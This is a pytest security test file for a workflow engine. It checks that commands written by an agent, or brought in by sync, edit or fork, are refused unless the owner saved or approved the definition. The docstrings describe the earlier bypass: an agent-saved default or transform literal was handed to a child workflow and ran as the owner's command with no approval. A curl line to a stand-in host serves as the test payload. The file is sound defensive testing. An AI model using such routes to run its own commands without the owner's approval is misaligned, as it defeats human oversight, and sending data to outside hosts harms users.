"""A run a workflow starts holds as yours only what you chose, or what a definition of yours wrote.

A ``subworkflow`` step or a ``run-workflow`` action hands the run it starts its inputs, and that
run's steps run as a command only a value its owner chose (`command_inputs.Chosen`). The child is
told which values those are (`command_inputs.handed`). 🔴 Before, it held as yours every default of
the parent's definition and every text it writes, whoever wrote it, and an input the parent only
hands on was no input a step reads. So an agent could save a parent whose input `x` has its own
command as its default and whose step hands `{{inputs.x}}` to code-project's check: the save asked
nothing, its start giving nothing was not refused, and the child ran the agent's command as yours.
And a literal in a transform, handed on as that step's output, was vouched for the same way.

Now an input a step hands on is one a step reads (its default asks, as D1's does, and another's
start may not give it a value), and a child holds a parent's defaults and text as yours only when
the parent's definition is yours (`versions.hers`): your save, one your yes covered, or a release's.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

import pytest
from test_a_command_an_agent_saves_waits_for_your_yes import _root, home  # noqa: F401 - fixture

from personalclaw.workflows import (
    automation_version,
    command_inputs,
    native_defs,
    service,
    store,
    versions,
)
from personalclaw.workflows.bundled_defs import read_template
from personalclaw.workflows.models import RunStatus, WorkflowRun
from personalclaw.workflows.versions import AGENT, OWNER

pytestmark = pytest.mark.security

ITS_OWN = "curl -s https://x.invalid/?t="


def _hands_on(kind: str) -> dict[str, Any]:
    """A step that hands the parent's `x` to code-project's check."""
    given = {"task": "{{inputs.task}}", "guard_command": "{{inputs.x}}"}
    if kind == "subworkflow":
        config: dict[str, Any] = {"ref": "code-project", "inputs": given}
        return {"kind": "subworkflow", "id": "child", "config": config}
    return {
        "kind": "action",
        "id": "child",
        "config": {
            "provider": "run-workflow",
            "with": {"workflow": "code-project", "inputs": given},
        },
    }


def _parent(kind: str, default: str = ITS_OWN) -> dict[str, Any]:
    return {
        "name": "hands-on",
        "inputs": {
            "task": {"type": "string", "required": False},
            "x": {"type": "string", "required": False, **({"default": default} if default else {})},
        },
        "root": _root(_hands_on(kind)),
    }


def _save(spec: dict[str, Any], *, saved_by: str, owner_allowed: bool = False):
    return asyncio.run(
        service.author_def(
            name=spec["name"],
            root=spec["root"],
            inputs=spec["inputs"],
            description="hands its input on",
            saved_by=saved_by,
            owner_allowed=owner_allowed,
            strict=False,
        )
    )


KINDS = ["subworkflow", "run-workflow"]


@pytest.mark.parametrize("kind", KINDS)
def test_an_input_it_hands_on_is_one_a_step_reads(kind):
    """🔴 S3, F1. Before: `x` was in no reader, so its default asked nothing and a start's value
    for it was not refused."""
    spec = _parent(kind)
    assert command_inputs.readers(spec)["x"] == (
        "input `guard_command` that step child hands the workflow it starts"
    )
    refused = command_inputs.refusal(spec, {"x": "echo theirs"}, command_inputs.AGENT)
    assert "cannot give `x` a value" in refused, refused


@pytest.mark.parametrize("kind", KINDS)
def test_an_agents_default_for_an_input_it_hands_on_waits_for_your_yes(kind):
    out = _save(_parent(kind), saved_by=AGENT)
    assert out.get("code") == "WF_DEF_NEEDS_OWNER_YES", out
    said = [" ".join(s["may"]) for s in out.get("steps") or []]
    assert any(ITS_OWN in s for s in said), said


def _versioned(spec: dict[str, Any], *, saved_by: str, owner_allowed: bool = False) -> int:
    out = _save(spec, saved_by=saved_by, owner_allowed=owner_allowed)
    assert out.get("ok") is True, out
    return versions.latest_version(spec["name"])


def _as_saved(name: str, version: int) -> dict[str, Any]:
    """Version *version* of *name* as a run started from it holds it."""
    record = versions.get_version(name, version)
    assert record is not None
    return versions.runnable(record.spec)


def test_a_definition_is_yours_when_you_saved_it_or_your_yes_covered_it():
    """F2's provenance: your save, and an agent's save your yes covered, are yours; an agent's
    save that asked you nothing, and a definition no version holds, are not."""
    mine = _versioned(_parent("subworkflow", default=""), saved_by=OWNER)
    assert versions.hers("hands-on", _as_saved("hands-on", mine)) is True
    theirs = _versioned({**_parent("subworkflow", default=""), "name": "theirs"}, saved_by=AGENT)
    assert versions.hers("theirs", _as_saved("theirs", theirs)) is False
    allowed = _versioned(
        {**_parent("subworkflow"), "name": "allowed"}, saved_by=AGENT, owner_allowed=True
    )
    assert versions.hers("allowed", _as_saved("allowed", allowed)) is True
    assert versions.hers("never-saved", _parent("subworkflow")) is False


def _brought_in(name: str, *, version: int, default: str) -> dict[str, Any]:
    """Write *name*'s definition file as another machine's sync, a restore or a pack does, through
    no door: *version* is the number the file itself carries. Returns it as a run reads it."""
    path = native_defs._def_path(name)
    stored = json.loads(path.read_text())
    stored["inputs"]["x"]["default"] = default
    stored["version"] = version
    path.write_text(json.dumps(stored))
    now = asyncio.run(automation_version.current(name))
    assert now is not None
    automation_version.keep(now)  # an Allow records it: nothing, when the number is taken
    return now.spec


def test_a_file_brought_in_under_a_number_you_saved_is_not_yours():
    """🔴 CORE's V1(a). Before: a sync that rewrote the file at the number of a version she saved
    was read by that number, so the child held the default it brought as hers."""
    v = _versioned(_parent("subworkflow", default=""), saved_by=OWNER)
    spec = _brought_in("hands-on", version=v, default=ITS_OWN)
    assert versions.get_version("hands-on", v).saved_by == OWNER, "the number is hers"
    assert versions.hers("hands-on", spec) is False
    vouched = command_inputs.handed(
        {"guard_command": ITS_OWN},
        spec=spec,
        extra={},
        definition_is_hers=versions.hers("hands-on", spec),
    )
    assert vouched.get(command_inputs.HANDED_BY_KEY) == "hands-on"


def test_a_file_brought_in_that_runs_as_your_version_is_yours():
    """The control: what a sync brings that runs as a version she saved is hers."""
    v = _versioned(_parent("subworkflow"), saved_by=OWNER)
    assert versions.hers("hands-on", _brought_in("hands-on", version=v, default=ITS_OWN)) is True


def _made_it(expr: str, **extra: Any) -> dict[str, Any]:
    return {
        "name": "made-it",
        "inputs": {"task": {"type": "string", "required": False}},
        "root": {
            "kind": "sequence",
            "id": "root",
            "children": [
                {"kind": "transform", "id": "t", "config": {"expr": expr}},
                {
                    "kind": "subworkflow",
                    "id": "child",
                    "config": {
                        "ref": "code-project",
                        "inputs": {"guard_command": "{{nodes.t.output}}"},
                    },
                },
            ],
        },
        **extra,
    }


def _a_run_of(name: str, spec: dict[str, Any], version: int) -> WorkflowRun:
    run = store.create(
        WorkflowRun(
            id="", workflow_name=name, status=RunStatus.DRAFT, inputs={}, spec_version=version
        )
    )
    store.write_spec(run.id, spec)
    return run


def _child_holds(run: WorkflowRun, value: str) -> bool:
    vouched = command_inputs.handed_by(run, {"guard_command": value})
    child = {"name": "code-project", "inputs": {"guard_command": {"type": "string"}}}
    return command_inputs.Chosen.of(child, {"guard_command": value}, vouched).chose("guard_command")


def test_a_runs_spec_an_edit_changed_is_not_your_version_whatever_its_number():
    """🔴 CORE's V1(b). An edit of a running run moves its number on (`commit_mutation`) and
    writes no version. Before: when she had saved a version at that number meanwhile, the run
    was read as that version, so the child held the transform's literal the edit wrote as hers."""
    v1 = versions.record_version("made-it", {**_made_it("ok"), "version": 1}, saved_by=OWNER)
    run = _a_run_of("made-it", versions.runnable({**_made_it("ok"), "version": 1}), v1)
    assert _child_holds(run, "ok"), "the control: the run as she saved it hands on hers"
    v2 = versions.record_version(
        "made-it", {**_made_it("ok", description="tidied"), "version": 2}, saved_by=OWNER
    )
    edited = store.read_spec(run.id) or {}
    edited["root"]["children"][0]["config"]["expr"] = ITS_OWN
    run.spec_version += 1  # what an edit's commit does to the run's number
    store.write_spec(run.id, edited)
    assert run.spec_version == v2
    assert _child_holds(run, ITS_OWN) is False


def test_a_run_started_from_a_version_in_the_history_is_yours():
    """The control: a run of a version she saved before her latest runs as that version."""
    versions.record_version("made-it", {**_made_it("make lint"), "version": 1}, saved_by=OWNER)
    versions.record_version("made-it", {**_made_it("make check"), "version": 2}, saved_by=OWNER)
    run = _a_run_of("made-it", versions.runnable({**_made_it("make lint"), "version": 1}), 1)
    assert _child_holds(run, "make lint")


def test_a_template_this_release_ships_is_yours_until_it_is_changed():
    """A release's definition is hers with no version recorded, as it ships; changed, it is not."""
    shipped = versions.runnable(read_template("code-project").to_dict())
    assert versions.hers("code-project", shipped) is True
    changed = json.loads(json.dumps(shipped))
    changed["description"] = "changed"
    changed.setdefault("inputs", {})["x"] = {"type": "string", "default": ITS_OWN}
    assert versions.hers("code-project", changed) is False


def test_only_the_texts_a_step_hands_on_are_yours_in_the_child():
    """CORE's nit. A text the parent writes that no step hands on (a stage's prompt) is not what
    the child is handed, so a step's output equal to it is no value she chose. A transform's
    expression, a `foreach`'s items, and a value a step hands on are."""
    spec = {
        "name": "says",
        "root": {
            "kind": "sequence",
            "id": "root",
            "children": [
                {"kind": "stage", "id": "s", "config": {"prompt": "make prompt"}},
                {"kind": "transform", "id": "t", "config": {"expr": {"cmd": "make expr"}}},
                {
                    "kind": "foreach",
                    "id": "each",
                    "config": {"items": ["make item"]},
                    "body": {
                        "kind": "subworkflow",
                        "id": "child",
                        "config": {
                            "ref": "code-project",
                            "inputs": {"guard_command": "{{item}}", "task": "make handed"},
                        },
                    },
                },
            ],
        },
    }
    given = {"a": "make prompt", "b": "make expr", "c": "make item", "d": "make handed"}
    held = command_inputs.handed(given, spec=spec, extra={}, definition_is_hers=True)
    chosen = command_inputs.Chosen.of({}, given, held)
    assert [chosen.chose(n) for n in "abcd"] == [False, True, True, True]


@pytest.mark.parametrize("hers", [False, True], ids=["another door's", "yours"])
def test_a_child_holds_a_parents_default_as_yours_only_from_your_definition(hers):
    """🔴 S3, F2. Before: the child held the agent-written default as yours."""
    vouched = command_inputs.handed(
        {"guard_command": ITS_OWN}, spec=_parent("subworkflow"), extra={}, definition_is_hers=hers
    )
    chosen = command_inputs.Chosen.of({}, {"guard_command": ITS_OWN}, vouched)
    assert chosen.chose("guard_command") is hers


@pytest.mark.parametrize("hers", [False, True], ids=["another door's", "yours"])
def test_a_transforms_literal_handed_on_is_yours_only_from_your_definition(hers):
    """🔴 Before: the literal in a transform, handed on as its output, was vouched as yours."""
    spec = {
        "name": "made-it",
        "root": {
            "kind": "sequence",
            "id": "root",
            "children": [
                {"kind": "transform", "id": "t", "config": {"expr": ITS_OWN}},
                {
                    "kind": "subworkflow",
                    "id": "child",
                    "config": {
                        "ref": "code-project",
                        "inputs": {"guard_command": "{{nodes.t.output}}"},
                    },
                },
            ],
        },
    }
    vouched = command_inputs.handed(
        {"guard_command": ITS_OWN}, spec=spec, extra={}, definition_is_hers=hers
    )
    assert (
        command_inputs.Chosen.of({}, {"guard_command": ITS_OWN}, vouched).chose("guard_command")
        is hers
    )


def test_a_value_you_chose_for_the_parent_is_yours_in_the_child_whoever_wrote_it():
    """The control: what you gave the parent run reaches its child as yours."""
    extra = command_inputs.vouch({}, {"x": "make check"})
    vouched = command_inputs.handed(
        {"guard_command": "make check"}, spec=_parent("subworkflow"), extra=extra
    )
    assert command_inputs.Chosen.of({}, {"guard_command": "make check"}, vouched).chose(
        "guard_command"
    )


@pytest.mark.parametrize(
    ("saved_by", "allowed", "hers"),
    [
        (OWNER, None, True),
        (versions.SHIPPED, None, True),
        (AGENT, None, False),
        (AGENT, True, True),
        ("", None, False),
    ],
    ids=["yours", "a release's", "an agent's", "an agent's your yes covered", "before the record"],
)
def test_a_version_saved_before_the_record_of_your_yes_is_read_as_its_door_says(
    saved_by, allowed, hers
):
    """The upgrade path. A version saved before a save recorded the owner's yes has no `allowed`
    key: it is read by who saved it. Your own saves, and a release's, stay yours, so a workflow
    you made works as before; an agent's or an app's that your yes may have covered, and one saved
    before the history said who saved it, are not, so what they write is no value you chose."""
    spec = {**_parent("subworkflow", default=""), "name": "before", "version": 1}
    versions.record_version("before", spec, saved_by=saved_by or OWNER)
    record_file = versions._version_path("before", 1)
    raw = json.loads(record_file.read_text())
    raw["saved_by"] = saved_by
    raw.pop("allowed", None)
    if allowed is not None:
        raw["allowed"] = allowed
    record_file.write_text(json.dumps(raw))
    assert versions.hers("before", versions.runnable(spec)) is hers


def test_an_input_handed_to_a_named_child_counts_only_when_the_child_runs_it():
    """B1: `task`, handed to code-project as its task text, is no input a step reads; one handed
    to a workflow named any other way may be, so it counts."""
    named = command_inputs.readers(_parent("subworkflow"))
    assert "x" in named and "task" not in named, named
    unnamed = _parent("subworkflow")
    unnamed["root"]["children"][0]["config"]["ref"] = "{{inputs.which}}"
    assert "task" in command_inputs.readers(unnamed)


def test_a_childs_refusal_names_the_parent_to_save_again():
    """U1, U2: a value a parent that is not yours hands on is refused saying where to make it
    yours: the parent's editor. Its own run's Run cannot give it, since the parent gives it."""
    vouched = command_inputs.handed(
        {"guard_command": ITS_OWN}, spec=_parent("subworkflow"), extra={}, definition_is_hers=False
    )
    child = {"name": "code-project", "inputs": {"guard_command": {"type": "string"}}}
    chosen = command_inputs.Chosen.of(child, {"guard_command": ITS_OWN}, vouched)
    said = chosen.refusal("{{inputs.guard_command}}", "the guard command")
    assert "“hands-on”" in said and "save it in its editor" in said, said
    mine = command_inputs.handed(
        {"guard_command": ITS_OWN}, spec=_parent("subworkflow"), extra={}, definition_is_hers=True
    )
    assert command_inputs.HANDED_BY_KEY not in mine


def _edit(run: WorkflowRun, expr: str) -> None:
    """Edit the running *run*'s transform to *expr* through an edit's own commit
    (`mid_flight.commit_mutation`), as a live run's edit lands."""
    from personalclaw.workflows import mid_flight, mutations
    from personalclaw.workflows.controller import EngineServices, RunController

    run = store.get(run.id) or run
    ctl = RunController(run, store.read_spec(run.id) or {}, services=EngineServices())
    ops = [mutations.Op.from_dict({"op": "update_node", "node_id": "t", "fields": {"expr": expr}})]
    candidate, issues = mutations.apply_batch(ops, ctl.spec, {})
    assert not issues, issues
    mid_flight.commit_mutation(ctl, mutations.BatchResult(ok=True, ops=ops, spec=candidate), "chat")
    assert (store.read_spec(run.id) or {})["root"]["children"][0]["config"]["expr"] == expr


def _childs_refusal(run: WorkflowRun, value: str) -> str:
    vouched = command_inputs.handed_by(store.get(run.id) or run, {"guard_command": value})
    child = {"name": "code-project", "inputs": {"guard_command": {"type": "string"}}}
    chosen = command_inputs.Chosen.of(child, {"guard_command": value}, vouched)
    return chosen.refusal("{{inputs.guard_command}}", "the guard command")


def test_a_childs_refusal_says_to_start_a_parent_edited_since_its_start_again():
    """🔴 N1. A parent run edited after it started is no version she saved, so the child refuses
    what it hands on. Before, the refusal said to save the parent in its editor, which changes
    nothing for that run. Now it says the run was edited, and to start it again."""
    v1 = versions.record_version("made-it", {**_made_it("ok"), "version": 1}, saved_by=OWNER)
    run = _a_run_of("made-it", versions.runnable({**_made_it("ok"), "version": 1}), v1)
    assert _childs_refusal(run, "ok") == "", "the control: her unedited run hands hers on"
    _edit(run, ITS_OWN)

    said = _childs_refusal(run, ITS_OWN)

    assert "“made-it”" in said and "was edited after it started" in said, said
    assert "start “made-it” again" in said, said
    assert "save it in its editor" not in said, said


@pytest.mark.parametrize("start", ["an agent's save", "an edit before this release"])
def test_an_edited_parent_that_did_not_start_as_yours_says_to_save_it_and_start_it_again(start):
    """CORE's nit on N1: a run that started from a definition not hers, then was edited, needs
    both, since starting it again from the same definition would hand on no more. So does one
    whose first edit's record says nothing of its start, as an edit before this release's."""
    saved_by = AGENT if start == "an agent's save" else OWNER
    v = versions.record_version("made-it", {**_made_it("ok"), "version": 1}, saved_by=saved_by)
    run = _a_run_of("made-it", versions.runnable({**_made_it("ok"), "version": 1}), v)
    _edit(run, ITS_OWN)
    if start == "an edit before this release":
        [kept] = (store.run_dir(run.id) / "spec_history").glob("v*.json")
        record = json.loads(kept.read_text())
        record.pop(store.STARTED_YOURS)
        kept.write_text(json.dumps(record))

    said = _childs_refusal(run, ITS_OWN)

    assert "was edited after it started" in said, said
    assert "save it in its editor, and start it again" in said, said


def test_a_parent_whose_definition_is_not_yours_still_says_to_save_it():
    """The other wording stands: an unedited run of a definition an agent saved says to save it in
    its editor, which is what makes it hers."""
    v = versions.record_version("made-it", {**_made_it(ITS_OWN), "version": 1}, saved_by=AGENT)
    run = _a_run_of("made-it", versions.runnable({**_made_it(ITS_OWN), "version": 1}), v)

    said = _childs_refusal(run, ITS_OWN)

    assert "“made-it”" in said and "save it in its editor" in said, said
    assert "edited after it started" not in said, said


def _kid(command: str) -> int:
    """Save, as yours, the workflow `kid` whose verify gate runs *command*."""
    gate = {
        "kind": "gate",
        "id": "verify",
        "config": {"kind": "verify_command", "verify": {"command": command}},
    }
    spec = {"name": "kid", "inputs": {"task": {"type": "string"}}, "root": _root(gate)}
    return _versioned(spec, saved_by=OWNER)


def test_a_child_changed_after_its_parents_start_still_refuses_anothers_value():
    """B1's backstop: the parent's start reads the child as it was. A child re-saved since to run
    the input as a command still holds the value someone else gave its parent as no value you
    chose, so its own step refuses it."""
    _kid("make check")
    parent = _parent("subworkflow", default="")
    parent["root"]["children"][0]["config"]["ref"] = "kid"
    given = {"task": "echo theirs"}
    assert command_inputs.refusal(parent, given, command_inputs.AGENT) == "", "v1 runs no task"
    _kid("{{inputs.task}}")
    parents_record = command_inputs.stamped({}, given, command_inputs.AGENT)
    vouched = command_inputs.handed(
        given, spec=parent, extra=parents_record, definition_is_hers=True
    )
    child = {"name": "kid", "inputs": {"task": {"type": "string"}}}
    said = command_inputs.Chosen.of(child, given, vouched).refusal(
        "{{inputs.task}}", "the verify gate", step="verify"
    )
    assert "is not one you chose" in said, said


def _own_default(name: str = "own-default", command: str = "{{inputs.x}}") -> dict[str, Any]:
    """A definition whose verify gate runs *command*, its input `x` defaulting to a command."""
    gate = {
        "kind": "gate",
        "id": "verify",
        "config": {"kind": "verify_command", "verify": {"command": command}},
    }
    return {
        "name": name,
        "version": 1,
        "inputs": {"x": {"type": "string", "required": False, "default": ITS_OWN}},
        "root": _root(gate),
    }


def _recorded_as(spec: dict[str, Any], saved_by: str) -> dict[str, Any]:
    """Record *spec* as a version *saved_by* saved with nothing asked of the owner, as every save
    through another door was before a save asked her; return it as a run reads it."""
    versions.record_version(spec["name"], spec, saved_by=saved_by)
    return versions.runnable(spec)


@pytest.mark.parametrize(
    "command", ["{{inputs.x}}", ITS_OWN], ids=["its own default", "its own literal"]
)
def test_anothers_start_of_a_definition_not_yours_that_runs_its_own_command_is_refused(command):
    """🔴 CORE's W1. Before: an agent's start that gave nothing ran the default, or the literal,
    of a definition an agent saved before a save asked you, as yours."""
    spec = _recorded_as(_own_default(command=command), AGENT)
    said = command_inputs.at_start(spec, {}, command_inputs.AGENT)
    assert "cannot run this workflow" in said and "save it in its editor" in said, said
    assert ITS_OWN in said, said
    assert command_inputs.at_start(spec, {}, "") == "", "your own start runs it"


def test_anothers_start_of_a_file_brought_in_that_runs_its_own_command_is_refused():
    v = _versioned(_parent("subworkflow", default=""), saved_by=OWNER)
    spec = _brought_in("hands-on", version=v, default=ITS_OWN)
    assert "cannot run this workflow" in command_inputs.at_start(spec, {}, command_inputs.AGENT)


@pytest.mark.parametrize(
    ("saved_by", "allowed"), [(OWNER, False), (AGENT, True)], ids=["yours", "your yes covered it"]
)
def test_anothers_start_of_your_definition_runs_its_own_command(saved_by, allowed):
    """The control: a definition that is yours runs its own command at anyone's start."""
    spec = _own_default()
    versions.record_version(spec["name"], spec, saved_by=saved_by, allowed=allowed)
    assert command_inputs.at_start(versions.runnable(spec), {}, command_inputs.AGENT) == ""


def test_anothers_start_of_a_shipped_template_or_one_that_writes_no_command_is_not_refused():
    """A release's template is yours as it ships, and a definition that runs only what you choose
    writes no command, whoever saved it."""
    shipped = versions.runnable(read_template("code-project").to_dict())
    assert command_inputs.at_start(shipped, {}, command_inputs.AGENT) == ""
    reads_yours = _own_default(name="reads-yours")
    reads_yours["inputs"]["x"].pop("default")
    spec = _recorded_as(reads_yours, AGENT)
    assert command_inputs.at_start(spec, {}, command_inputs.AGENT) == ""


def _saved_native(spec: dict[str, Any], *, saved_by: str) -> None:
    """Write *spec* as this home's definition file and its version as *saved_by* saved it with
    nothing asked of the owner, as a save through another door did before a save asked her."""
    path = native_defs._def_path(spec["name"])
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(spec))
    versions.record_version(spec["name"], spec, saved_by=saved_by)


def test_every_start_asks_whether_the_definition_is_yours_to_start():
    """W1 at the door every start goes through (`service._admitted_inputs`): an agent's start of
    a definition an agent saved before a save asked you is refused before any run exists, and
    your own start of it is not."""
    _saved_native(_own_default(), saved_by=AGENT)
    out = asyncio.run(
        service.start_run(name="own-default", started_by=command_inputs.AGENT, inputs={})
    )
    assert out.get("code") == "WF_RUN_COMMAND_INPUT", out
    assert "save it in its editor" in out["message"], out["message"]
    assert store.all_runs() == [], "no run exists"
    mine = asyncio.run(service.start_run(name="own-default", started_by="", inputs={}))
    assert mine.get("code") != "WF_RUN_COMMAND_INPUT", mine


@pytest.mark.parametrize(
    ("under", "allowed", "hers"),
    [(OWNER, False, True), (AGENT, False, False), (AGENT, True, True)],
    ids=["over yours", "over an agent's you were not asked about", "over one your yes covered"],
)
def test_a_version_the_publish_switch_saved_runs_as_the_one_under_it(under, allowed, hers):
    """CORE's H8. The publish switch saves a version that only flips whether an outside agent may
    start it, so it runs as the version under it, and that one decides whose it is."""
    spec = {**_own_default(name="published"), "version": 1}
    versions.record_version("published", spec, saved_by=under, allowed=allowed)
    flipped = {**spec, "version": 2, "metadata": {"a2a_published": True}}
    versions.record_version("published", flipped, saved_by=versions.PUBLISH)
    assert versions.hers("published", versions.runnable(flipped)) is hers


# ── W1c: a run someone else started starts no workflow not yours that runs its own command ──


def _kid_not_yours() -> dict[str, Any]:
    """`kid`, saved by an agent before a save asked you, whose verify gate runs its own literal."""
    gate = {
        "kind": "gate",
        "id": "verify",
        "config": {"kind": "verify_command", "verify": {"command": ITS_OWN}},
    }
    spec = {"name": "kid", "version": 1, "inputs": {}, "root": _root(gate)}
    _saved_native(spec, saved_by=AGENT)
    return versions.runnable(spec)


def _parent_run(started_by: str) -> WorkflowRun:
    run = store.create(
        WorkflowRun(
            id="",
            workflow_name="names-kid",
            status=RunStatus.RUNNING,
            inputs={},
            extra=command_inputs.stamped({}, {}, started_by),
        )
    )
    return run


@pytest.mark.parametrize("started_by", [command_inputs.AGENT, command_inputs.A2A, ""])
def test_a_run_someone_else_started_starts_no_workflow_not_yours_that_runs_its_own(started_by):
    """🔴 CORE's W1c. Before: an agent's start of your parent passed W1, since the parent is
    yours, and its step then started `kid`, which no start door asked, so `kid`'s literal ran."""
    from personalclaw.workflows.bindings import BindingContext
    from personalclaw.workflows.engine import dispatch_subworkflow
    from personalclaw.workflows.models import Node

    _kid_not_yours()
    parent = _parent_run(started_by)
    step = Node.from_dict({"kind": "subworkflow", "id": "child", "config": {"ref": "kid"}})
    before = len(store.all_runs())
    result = asyncio.run(
        dispatch_subworkflow(step, BindingContext(), run_id=parent.id, supervisor=object())
    )
    said = result.failure.cause_plain if result.failure else ""
    if started_by:
        assert "cannot start 'kid'" in said and "save it in its editor" in said, said
        assert len(store.all_runs()) == before, "no child run exists"
    else:
        assert "cannot start 'kid'" not in said, "your own start runs your parent's children"


def test_what_a_run_records_of_who_started_it_reaches_its_children_and_forks():
    agents = command_inputs.stamped({}, {}, command_inputs.AGENT)
    assert command_inputs.starter(agents) == command_inputs.AGENT
    child = command_inputs.handed({}, spec={"name": "p"}, extra=agents, definition_is_hers=True)
    assert command_inputs.starter(child) == command_inputs.AGENT
    assert command_inputs.starter(command_inputs.carried(agents)) == command_inputs.AGENT
    assert command_inputs.starter(command_inputs.stamped({}, {}, "")) == ""
    assert command_inputs.starter({}) == command_inputs.OTHER, "a run that says nothing"


def test_an_automation_you_did_not_make_starts_no_workflow_not_yours_that_runs_its_own():
    from personalclaw.action_providers.run_workflow_provider import _not_theirs

    spec = _kid_not_yours()
    theirs = command_inputs.stamped({}, {}, command_inputs.OTHER)
    assert "save it in its editor" in _not_theirs(spec, theirs, fired=True)
    assert _not_theirs(spec, command_inputs.stamped({}, {}, ""), fired=True) == ""
    # And a step's run-workflow in a run someone else started: the start's own words.
    stepped = command_inputs.handed({}, spec={"name": "p"}, extra=theirs, definition_is_hers=True)
    assert "cannot run this workflow" in _not_theirs(spec, stepped, fired=False)


def test_anothers_start_of_a_fork_of_a_definition_not_yours_is_refused():
    """CORE's W1c, the fork: a run of `kid` you started, forked and started by an agent
    (`workflow_start_draft`), is refused; your own start of the fork is not."""
    spec = _kid_not_yours()
    draft = store.create(
        WorkflowRun(
            id="",
            workflow_name="kid",
            status=RunStatus.DRAFT,
            inputs={},
            extra=command_inputs.carried(command_inputs.stamped({}, {}, "")),
        )
    )
    store.write_spec(draft.id, spec)
    theirs = asyncio.run(service.start_draft_run(draft.id, started_by=command_inputs.AGENT))
    assert theirs.get("code") == "WF_RUN_COMMAND_INPUT", theirs
    mine = asyncio.run(service.start_draft_run(draft.id, started_by=""))
    assert mine.get("code") != "WF_RUN_COMMAND_INPUT", mine
